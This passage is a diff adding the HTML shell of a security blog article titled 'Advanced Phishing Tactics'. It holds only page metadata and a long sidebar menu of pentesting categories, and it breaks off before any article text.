@@ -1,0 +1,1340 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Advanced Phishing Tactics - Evilsaint</title>
+	<link rel="shortcut icon" type="image/png" href="../../static/images/favicon.ico"/>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="../../static/css/bootstrap.min.css">
+	<!-- CSS only -->
+	<link href="../../static/fontawesome/css/all.css" rel="stylesheet"/>
+	<!-- <link href="/static/css/font-awesome.min.css" rel="stylesheet"/> -->
+	<link rel="stylesheet" href="../../static/css/responsive.css">
+	<link rel="stylesheet" href="../../static/menu/metismenu-3.0.5/dist/metisMenu.css">
+	<link rel="stylesheet" href="../../static/css/style.css">
+	<link rel="stylesheet" href="../../static/css/codehilite.css">
+    
+	<script src="../../static/js/jquery-3.6.0.min.js"></script>
+    
+	<meta name="keywords" content="Advanced Phishing Tactics, Advanced Phishing, Phishing Tactics,"/>
+	<meta name="description" content="Advanced Phishing Tactics, Emails are one of the few technologies that almost everyone, technical or non-technical, is familiar with. Even the most.. READ MORE..."/>
+	
+<!-- Schema.org markup for Google+ -->
+<meta itemprop="name" content="Advanced Phishing Tactics" />
+<meta itemprop="description" content="Advanced Phishing Tactics, Emails are one of the few technologies that almost everyone, technical or non-technical, is familiar with. Even the most.. READ MORE..." />
+
+<meta itemprop="image" content="https://evilsaint.com/media/articles/images/advanced-phishing-tactics/cover_image/advanced_phishing.jpg" />
+
+
+
+<meta name="image" content="https://evilsaint.com/media/articles/images/advanced-phishing-tactics/cover_image/advanced_phishing.jpg" />
+
+
+<!-- Twitter Card data -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@_EvilSaint_" />
+<meta name="twitter:title" content="Advanced Phishing Tactics" />
+<meta name="twitter:description" content="Advanced Phishing Tactics, Emails are one of the few technologies that almost everyone, technical or non-technical, is familiar with. Even the most.. READ MORE..." />
+<meta name="twitter:creator" content="@_EvilSaint_" />
+
+<meta name="twitter:image:src" content="https://evilsaint.com/media/articles/images/advanced-phishing-tactics/cover_image/advanced_phishing.jpg" />
+
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Advanced Phishing Tactics" />
+<meta property="og:type" content="article" />
+<meta property="og:locale" content="en_gb" />
+<meta property="og:url" content="https://evilsaint.com/article/advanced-phishing-tactics/" />
+<meta property="og:description" content="Advanced Phishing Tactics, Emails are one of the few technologies that almost everyone, technical or non-technical, is familiar with. Even the most.. READ MORE..." />
+<meta property="og:site_name" content="EvilSaint" />
+<meta property="article:published_time" content="17 Aug 2021, 2:57 p.m." />
+<meta property="article:modified_time" content="17 Aug 2021, 2:57 p.m." />
+<meta property="article:section" content="Article Section" />
+<meta property="article:tag" content="Red Teaming," />
+<meta property="fb:admins" content="Facebook numberic ID" />
+
+<meta name="og:image" content="https://evilsaint.com/media/articles/images/advanced-phishing-tactics/cover_image/advanced_phishing.jpg" />
+
+
+</head>
+<body>
+<!---- MAIN CONTENT START ---->
+<div id="main" class="site-main main">
+	<div class="row mr">
+        <!---- LEFT SIDEBAR GRID START ---->
+		<div class="col-12 col-sm-3 col-md-3 col-lg-3 left-section-bg pd">
+			<!---- SIDEBAR MAIN START ---->
+            <aside class="sidebar">
+				<!---- SIDEBAR LOGO START ---->
+                <div class="logo">
+					<a href="../../index.html"><img src="../../static/images/evilsaint_shield_logo.png" alt="EvilSaint Logo" title="EvilSaint Logo"></a>
+				</div>
+                <!----  SIDEBAR LOGO END  ---->
+                <!---- SIDEBAR CONTENT START ---->
+				<div class="sidebar-content">
+					
+<!-- CATEGORY SECTION START -->
+<section id="category-section">
+    <h2 class="sidebar-heading" title="Categories">Menu<span class="line"></span></h2>
+    <div class="collapse navbar-collapse in" id="navbarSupportedContent">
+	    <nav id="side-menu"><ul class="level_1"><li class="category-listitem tier-1 no-children"><a href="../../category/article/index.html" title="Category: Article" id="category-link-121" class="category-linkitem tier-1 no-arrow " >Article</a><li class="category-listitem tier-1 no-children"><a href="../../category/blog-posts/index.html" title="Category: Blog Posts" id="category-link-137" class="category-linkitem tier-1 no-arrow " >Blog Posts</a><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Building Labs and Virtual Machines" id="category-link-7" class="category-linkitem tier-1 has-arrow " >Building Labs and Virtual Machines</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/building-labs-and-virtual-machines/hyper-v.html" title="Category: Hyper-v" id="category-link-74" class="category-linkitem tier-2 no-arrow " >Hyper-v</a><li class="category-listitem tier-2 no-children"><a href="../../category/building-labs-and-virtual-machines/vmware.html" title="Category: VMware" id="category-link-73" class="category-linkitem tier-2 no-arrow " >VMware</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Capture The Flag" id="category-link-114" class="category-linkitem tier-1 has-arrow " >Capture The Flag</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/capture-the-flag/hack-the-box.html" title="Category: Hack The Box" id="category-link-116" class="category-linkitem tier-2 no-arrow " >Hack The Box</a><li class="category-listitem tier-2 no-children"><a href="../../category/capture-the-flag/vulnhub.html" title="Category: Vulnhub" id="category-link-117" class="category-linkitem tier-2 no-arrow " >Vulnhub</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Cloud" id="category-link-6" class="category-linkitem tier-1 has-arrow " >Cloud</a><ul class="level_2"><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Amazon Web Services" id="category-link-41" class="category-linkitem tier-2 has-arrow " >Amazon Web Services</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/cloud/amazon-web-services/amazon-relational-database-service-rds.html" title="Category: Amazon Relational Database Service (RDS)" id="category-link-102" class="category-linkitem tier-3 no-arrow " >Amazon Relational Database Service (RDS)</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/cloud/azure.html" title="Category: Azure" id="category-link-40" class="category-linkitem tier-2 no-arrow " >Azure</a><li class="category-listitem tier-2 no-children"><a href="../../category/cloud/google-cloud-platform.html" title="Category: Google Cloud Platform" id="category-link-42" class="category-linkitem tier-2 no-arrow " >Google Cloud Platform</a><li class="category-listitem tier-2 no-children"><a href="../../category/cloud/vultr.html" title="Category: Vultr" id="category-link-111" class="category-linkitem tier-2 no-arrow " >Vultr</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Configuration Reviews" id="category-link-4" class="category-linkitem tier-1 has-arrow " >Configuration Reviews</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/configuration-reviews/cisco.html" title="Category: Cisco" id="category-link-37" class="category-linkitem tier-2 no-arrow " >Cisco</a><li class="category-listitem tier-2 no-children"><a href="../../category/configuration-reviews/juniper.html" title="Category: Juniper" id="category-link-36" class="category-linkitem tier-2 no-arrow " >Juniper</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Databases" id="category-link-76" class="category-linkitem tier-1 has-arrow " >Databases</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/databases/amazon-relational-database-service-rds.html" title="Category: Amazon Relational Database Service (RDS)" id="category-link-103" class="category-linkitem tier-2 no-arrow " >Amazon Relational Database Service (RDS)</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/microsoft-sql-server.html" title="Category: Microsoft SQL Server" id="category-link-101" class="category-linkitem tier-2 no-arrow " >Microsoft SQL Server</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/mongodb.html" title="Category: MongoDB" id="category-link-105" class="category-linkitem tier-2 no-arrow " >MongoDB</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/mysql.html" title="Category: MySQL" id="category-link-94" class="category-linkitem tier-2 no-arrow " >MySQL</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/oracle.html" title="Category: Oracle" id="category-link-95" class="category-linkitem tier-2 no-arrow " >Oracle</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/postgres.html" title="Category: Postgres" id="category-link-77" class="category-linkitem tier-2 no-arrow " >Postgres</a><li class="category-listitem tier-2 no-children"><a href="../../category/databases/sqlite.html" title="Category: SQLite" id="category-link-104" class="category-linkitem tier-2 no-arrow " >SQLite</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: DevOps" id="category-link-79" class="category-linkitem tier-1 has-arrow " >DevOps</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/devops/docker.html" title="Category: Docker" id="category-link-83" class="category-linkitem tier-2 no-arrow " >Docker</a><li class="category-listitem tier-2 no-children"><a href="../../category/devops/git.html" title="Category: Git" id="category-link-80" class="category-linkitem tier-2 no-arrow " >Git</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Download" id="category-link-118" class="category-linkitem tier-1 has-arrow " >Download</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/download/cheat-sheet/index.html" title="Category: Cheat Sheet" id="category-link-119" class="category-linkitem tier-2 no-arrow " >Cheat Sheet</a><li class="category-listitem tier-2 no-children"><a href="../../category/download/wallpaper/index.html" title="Category: Wallpaper" id="category-link-120" class="category-linkitem tier-2 no-arrow " >Wallpaper</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Error messages" id="category-link-172" class="category-linkitem tier-1 has-arrow " >Error messages</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/error-messages/linux.html" title="Category: Linux" id="category-link-173" class="category-linkitem tier-2 no-arrow " >Linux</a><li class="category-listitem tier-2 no-children"><a href="../../category/error-messages/windows.html" title="Category: Windows" id="category-link-174" class="category-linkitem tier-2 no-arrow " >Windows</a></li></ul><li class="category-listitem tier-1 no-children"><a href="../../category/forensics.html" title="Category: Forensics" id="category-link-125" class="category-linkitem tier-1 no-arrow " >Forensics</a><li class="category-listitem tier-1 no-children"><a href="../../category/how-s.html" title="Category: How-To's" id="category-link-171" class="category-linkitem tier-1 no-arrow " >How-To's</a><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Infrastructure" id="category-link-130" class="category-linkitem tier-1 has-arrow " >Infrastructure</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/infrastructure/vpn.html" title="Category: VPN" id="category-link-131" class="category-linkitem tier-2 no-arrow " >VPN</a></li></ul><li class="category-listitem tier-1 no-children"><a href="../../category/linux-security.html" title="Category: Linux Security" id="category-link-170" class="category-linkitem tier-1 no-arrow " >Linux Security</a><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Operating Systems" id="category-link-5" class="category-linkitem tier-1 has-arrow " >Operating Systems</a><ul class="level_2"><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Linux" id="category-link-39" class="category-linkitem tier-2 has-arrow " >Linux</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/linux/centos-based.html" title="Category: Centos-Based" id="category-link-177" class="category-linkitem tier-3 no-arrow " >Centos-Based</a><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/linux/debian-based.html" title="Category: Debian-Based" id="category-link-112" class="category-linkitem tier-3 no-arrow " >Debian-Based</a><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/linux/kali-linux.html" title="Category: Kali Linux" id="category-link-72" class="category-linkitem tier-3 no-arrow " >Kali Linux</a><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/linux/parrot-os.html" title="Category: Parrot OS" id="category-link-113" class="category-linkitem tier-3 no-arrow " >Parrot OS</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/operating-systems/linux-generic.html" title="Category: Linux (Generic)" id="category-link-175" class="category-linkitem tier-2 no-arrow " >Linux (Generic)</a><li class="category-listitem tier-2 no-children"><a href="../../category/operating-systems/mac-os.html" title="Category: Mac OS" id="category-link-78" class="category-linkitem tier-2 no-arrow " >Mac OS</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Windows Desktop" id="category-link-38" class="category-linkitem tier-2 has-arrow " >Windows Desktop</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/windows-desktop/windows-10.html" title="Category: Windows-10" id="category-link-69" class="category-linkitem tier-3 no-arrow " >Windows-10</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/operating-systems/windows-generic.html" title="Category: Windows (Generic)" id="category-link-179" class="category-linkitem tier-2 no-arrow " >Windows (Generic)</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Windows Server" id="category-link-70" class="category-linkitem tier-2 has-arrow " >Windows Server</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/operating-systems/windows-server/windows-server-2016.html" title="Category: Windows Server 2016" id="category-link-71" class="category-linkitem tier-3 no-arrow " >Windows Server 2016</a></li></ul></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Pentest Phases" id="category-link-1" class="category-linkitem tier-1 has-arrow " >Pentest Phases</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/command-and-control.html" title="Category: Command and Control" id="category-link-13" class="category-linkitem tier-2 no-arrow " >Command and Control</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/credential-access.html" title="Category: Credential Access" id="category-link-9" class="category-linkitem tier-2 no-arrow " >Credential Access</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/defense-evasion.html" title="Category: Defense Evasion" id="category-link-19" class="category-linkitem tier-2 no-arrow " >Defense Evasion</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/discovery.html" title="Category: Discovery" id="category-link-8" class="category-linkitem tier-2 no-arrow " >Discovery</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/execution.html" title="Category: Execution" id="category-link-20" class="category-linkitem tier-2 no-arrow " >Execution</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/exfiltration.html" title="Category: Exfiltration" id="category-link-14" class="category-linkitem tier-2 no-arrow " >Exfiltration</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/impact.html" title="Category: Impact" id="category-link-16" class="category-linkitem tier-2 no-arrow " >Impact</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Initial Access" id="category-link-11" class="category-linkitem tier-2 has-arrow " >Initial Access</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/pentest-phases/initial-access/external-remote-services.html" title="Category: External Remote Services" id="category-link-67" class="category-linkitem tier-3 no-arrow " >External Remote Services</a><li class="category-listitem tier-3 no-children"><a href="../../category/pentest-phases/initial-access/phishing.html" title="Category: Phishing" id="category-link-66" class="category-linkitem tier-3 no-arrow " >Phishing</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/lateral-movement.html" title="Category: Lateral Movement" id="category-link-18" class="category-linkitem tier-2 no-arrow " >Lateral Movement</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/loot-collection.html" title="Category: Loot Collection" id="category-link-17" class="category-linkitem tier-2 no-arrow " >Loot Collection</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/persistence.html" title="Category: Persistence" id="category-link-10" class="category-linkitem tier-2 no-arrow " >Persistence</a><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/privilege-escalation.html" title="Category: Privilege Escalation" id="category-link-15" class="category-linkitem tier-2 no-arrow " >Privilege Escalation</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Reconnaissance" id="category-link-12" class="category-linkitem tier-2 has-arrow " >Reconnaissance</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/pentest-phases/reconnaissance/active-scanning.html" title="Category: Active Scanning" id="category-link-65" class="category-linkitem tier-3 no-arrow " >Active Scanning</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/pentest-phases/resource-development.html" title="Category: Resource Development" id="category-link-21" class="category-linkitem tier-2 no-arrow " >Resource Development</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Programming Languages" id="category-link-3" class="category-linkitem tier-1 has-arrow " >Programming Languages</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/bash-scripting.html" title="Category: Bash Scripting" id="category-link-75" class="category-linkitem tier-2 no-arrow " >Bash Scripting</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/c.html" title="Category: C#" id="category-link-32" class="category-linkitem tier-2 no-arrow " >C#</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/java.html" title="Category: Java" id="category-link-34" class="category-linkitem tier-2 no-arrow " >Java</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/php.html" title="Category: PHP" id="category-link-68" class="category-linkitem tier-2 no-arrow " >PHP</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/powershell.html" title="Category: PowerShell" id="category-link-35" class="category-linkitem tier-2 no-arrow " >PowerShell</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/python.html" title="Category: Python" id="category-link-31" class="category-linkitem tier-2 no-arrow " >Python</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/ruby.html" title="Category: Ruby" id="category-link-33" class="category-linkitem tier-2 no-arrow " >Ruby</a><li class="category-listitem tier-2 no-children"><a href="../../category/programming-languages/visual-basic.html" title="Category: Visual Basic" id="category-link-30" class="category-linkitem tier-2 no-arrow " >Visual Basic</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Protocols" id="category-link-81" class="category-linkitem tier-1 has-arrow " >Protocols</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/domain-name-system-dns.html" title="Category: Domain Name System (DNS)" id="category-link-108" class="category-linkitem tier-2 no-arrow " >Domain Name System (DNS)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/dynamic-host-configuration-protocol-dhcp.html" title="Category: Dynamic Host Configuration Protocol (DHCP)" id="category-link-107" class="category-linkitem tier-2 no-arrow " >Dynamic Host Configuration Protocol (DHCP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/file-transfer-protocol-ftp.html" title="Category: File Transfer Protocol (FTP)" id="category-link-110" class="category-linkitem tier-2 no-arrow " >File Transfer Protocol (FTP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/internet-message-access-protocol-imap.html" title="Category: Internet message access protocol (IMAP)" id="category-link-92" class="category-linkitem tier-2 no-arrow " >Internet message access protocol (IMAP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/kerberos.html" title="Category: Kerberos" id="category-link-93" class="category-linkitem tier-2 no-arrow " >Kerberos</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/post-office-protocol-3-pop3.html" title="Category: Post Office Protocol 3 (POP3)" id="category-link-91" class="category-linkitem tier-2 no-arrow " >Post Office Protocol 3 (POP3)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/remote-desktop-protocol-rdp.html" title="Category: Remote Desktop Protocol (RDP)" id="category-link-87" class="category-linkitem tier-2 no-arrow " >Remote Desktop Protocol (RDP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/secure-shell-ssh.html" title="Category: Secure Shell (SSH)" id="category-link-82" class="category-linkitem tier-2 no-arrow " >Secure Shell (SSH)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/secure-socket-layer-ssl-transport-layer-security-tls.html" title="Category: Secure Socket Layer (SSL) / Transport Layer Security (TLS)" id="category-link-126" class="category-linkitem tier-2 no-arrow " >Secure Socket Layer (SSL) / Transport Layer Security (TLS)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/server-message-block-smb.html" title="Category: Server Message Block (SMB)" id="category-link-134" class="category-linkitem tier-2 no-arrow " >Server Message Block (SMB)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/simple-mail-transfer-protocol-smtp.html" title="Category: Simple Mail Transfer Protocol (SMTP)" id="category-link-90" class="category-linkitem tier-2 no-arrow " >Simple Mail Transfer Protocol (SMTP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/simple-network-management-protocol-snmp.html" title="Category: Simple Network Management Protocol (SNMP)" id="category-link-106" class="category-linkitem tier-2 no-arrow " >Simple Network Management Protocol (SNMP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/trivial-file-transfer-protocol-tftp.html" title="Category: Trivial File Transfer Protocol (TFTP)" id="category-link-109" class="category-linkitem tier-2 no-arrow " >Trivial File Transfer Protocol (TFTP)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/virtual-network-computing-vnc.html" title="Category: Virtual Network Computing (VNC)" id="category-link-182" class="category-linkitem tier-2 no-arrow " >Virtual Network Computing (VNC)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/windows-management-instrumentation-wmi.html" title="Category: Windows Management Instrumentation (WMI)" id="category-link-88" class="category-linkitem tier-2 no-arrow " >Windows Management Instrumentation (WMI)</a><li class="category-listitem tier-2 no-children"><a href="../../category/protocols/windows-remote-management-winrm.html" title="Category: Windows Remote Management (WinRM)" id="category-link-89" class="category-linkitem tier-2 no-arrow " >Windows Remote Management (WinRM)</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Red Teaming" id="category-link-135" class="category-linkitem tier-1 has-arrow " >Red Teaming</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/red-teaming/c2-channels.html" title="Category: C2 Channels" id="category-link-136" class="category-linkitem tier-2 no-arrow " >C2 Channels</a></li></ul><li class="category-listitem tier-1 no-children"><a href="../../category/review/index.html" title="Category: Review" id="category-link-115" class="category-linkitem tier-1 no-arrow " >Review</a><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Software" id="category-link-96" class="category-linkitem tier-1 has-arrow " >Software</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/software/citrix.html" title="Category: Citrix" id="category-link-98" class="category-linkitem tier-2 no-arrow " >Citrix</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Microsoft" id="category-link-99" class="category-linkitem tier-2 has-arrow " >Microsoft</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/software/microsoft/active-directory.html" title="Category: Active Directory" id="category-link-186" class="category-linkitem tier-3 no-arrow " >Active Directory</a><li class="category-listitem tier-3 no-children"><a href="../../category/software/microsoft/office-365-o365.html" title="Category: Office 365 (O365)" id="category-link-97" class="category-linkitem tier-3 no-arrow " >Office 365 (O365)</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/software/solarwinds.html" title="Category: SolarWinds" id="category-link-100" class="category-linkitem tier-2 no-arrow " >SolarWinds</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Tools" id="category-link-2" class="category-linkitem tier-1 has-arrow " >Tools</a><ul class="level_2"><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Cracking And Brute-force" id="category-link-27" class="category-linkitem tier-2 has-arrow " >Cracking And Brute-force</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/cracking-and-brute-force/hashcat.html" title="Category: Hashcat" id="category-link-128" class="category-linkitem tier-3 no-arrow " >Hashcat</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/cracking-and-brute-force/john-ripper.html" title="Category: John the Ripper" id="category-link-63" class="category-linkitem tier-3 no-arrow " >John the Ripper</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/cracking-and-brute-force/thc-hydra.html" title="Category: THC Hydra" id="category-link-64" class="category-linkitem tier-3 no-arrow " >THC Hydra</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Debuggers" id="category-link-28" class="category-linkitem tier-2 has-arrow " >Debuggers</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/debuggers/gdb.html" title="Category: GDB" id="category-link-61" class="category-linkitem tier-3 no-arrow " >GDB</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/debuggers/ida-pro.html" title="Category: IDA Pro" id="category-link-58" class="category-linkitem tier-3 no-arrow " >IDA Pro</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/debuggers/immunity-debugger.html" title="Category: Immunity Debugger" id="category-link-60" class="category-linkitem tier-3 no-arrow " >Immunity Debugger</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/debuggers/ollydbg.html" title="Category: OllyDbg" id="category-link-59" class="category-linkitem tier-3 no-arrow " >OllyDbg</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/debuggers/windbg.html" title="Category: WinDbg" id="category-link-62" class="category-linkitem tier-3 no-arrow " >WinDbg</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Encryption" id="category-link-22" class="category-linkitem tier-2 has-arrow " >Encryption</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/encryption/openvpn.html" title="Category: OpenVPN" id="category-link-55" class="category-linkitem tier-3 no-arrow " >OpenVPN</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/encryption/stunnel.html" title="Category: Stunnel" id="category-link-56" class="category-linkitem tier-3 no-arrow " >Stunnel</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/encryption/tor.html" title="Category: Tor" id="category-link-57" class="category-linkitem tier-3 no-arrow " >Tor</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/tools/GTFOBins.html" title="Category: GTFOBins" id="category-link-176" class="category-linkitem tier-2 no-arrow " >GTFOBins</a><li class="category-listitem tier-2 no-children"><a href="../../category/tools/injection.html" title="Category: Injection" id="category-link-184" class="category-linkitem tier-2 no-arrow " >Injection</a><li class="category-listitem tier-2 no-children"><a href="../../category/tools/interlace.html" title="Category: Interlace" id="category-link-123" class="category-linkitem tier-2 no-arrow " >Interlace</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Packet Crafting" id="category-link-23" class="category-linkitem tier-2 has-arrow " >Packet Crafting</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-crafting/hping.html" title="Category: Hping" id="category-link-52" class="category-linkitem tier-3 no-arrow " >Hping</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-crafting/netcat.html" title="Category: Netcat" id="category-link-51" class="category-linkitem tier-3 no-arrow " >Netcat</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-crafting/scapy.html" title="Category: Scapy" id="category-link-53" class="category-linkitem tier-3 no-arrow " >Scapy</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-crafting/socat.html" title="Category: Socat" id="category-link-54" class="category-linkitem tier-3 no-arrow " >Socat</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Packet Sniffing" id="category-link-29" class="category-linkitem tier-2 has-arrow " >Packet Sniffing</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-sniffing/tcpdump.html" title="Category: TCPDump" id="category-link-46" class="category-linkitem tier-3 no-arrow " >TCPDump</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/packet-sniffing/wireshark.html" title="Category: Wireshark" id="category-link-45" class="category-linkitem tier-3 no-arrow " >Wireshark</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Port Scanners" id="category-link-24" class="category-linkitem tier-2 has-arrow " >Port Scanners</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/port-scanners/angry-ip-scanner.html" title="Category: Angry IP Scanner" id="category-link-50" class="category-linkitem tier-3 no-arrow " >Angry IP Scanner</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/port-scanners/unicornscan.html" title="Category: Unicornscan" id="category-link-49" class="category-linkitem tier-3 no-arrow " >Unicornscan</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Remote Connection" id="category-link-132" class="category-linkitem tier-2 has-arrow " >Remote Connection</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/remote-connection/rdesktop.html" title="Category: rdesktop" id="category-link-133" class="category-linkitem tier-3 no-arrow " >rdesktop</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/remote-connection/virtual-network-computing-vnc.html" title="Category: Virtual Network Computing (VNC)" id="category-link-183" class="category-linkitem tier-3 no-arrow " >Virtual Network Computing (VNC)</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/tools/text-editors.html" title="Category: Text Editors" id="category-link-178" class="category-linkitem tier-2 no-arrow " >Text Editors</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Vulnerability Scanners" id="category-link-25" class="category-linkitem tier-2 has-arrow " >Vulnerability Scanners</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/vulnerability-scanners/nessus.html" title="Category: Nessus" id="category-link-47" class="category-linkitem tier-3 no-arrow " >Nessus</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/vulnerability-scanners/openvas.html" title="Category: OpenVAS" id="category-link-48" class="category-linkitem tier-3 no-arrow " >OpenVAS</a></li></ul><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Web Proxies And Web Scanners" id="category-link-26" class="category-linkitem tier-2 has-arrow " >Web Proxies And Web Scanners</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tools/web-proxies-and-web-scanners/burpsuite-pro.html" title="Category: BurpSuite Pro" id="category-link-43" class="category-linkitem tier-3 no-arrow " >BurpSuite Pro</a><li class="category-listitem tier-3 no-children"><a href="../../category/tools/web-proxies-and-web-scanners/owasp-zap-zed-attack-proxy.html" title="Category: OWASP ZAP Zed Attack Proxy" id="category-link-44" class="category-linkitem tier-3 no-arrow " >OWASP ZAP Zed Attack Proxy</a><li class="category-listitem tier-3 